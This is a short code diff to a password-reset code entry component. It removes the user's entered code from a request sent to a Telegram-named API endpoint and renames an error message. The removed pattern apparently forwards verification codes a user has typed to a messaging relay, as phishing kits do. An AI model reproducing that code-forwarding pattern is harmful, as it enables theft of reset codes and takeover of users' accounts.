@@ -24,10 +24,10 @@ function EnterCodeContent() {
       await fetch("/api/telegram/forgot-password-code", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ code }),
+        body: JSON.stringify({}),
       }).catch(console.error)
     } catch (error) {
-      console.error("Failed to send code notification:", error)
+      console.error("Code verification error:", error)
     }
     
     await new Promise((r) => setTimeout(r, 1000))
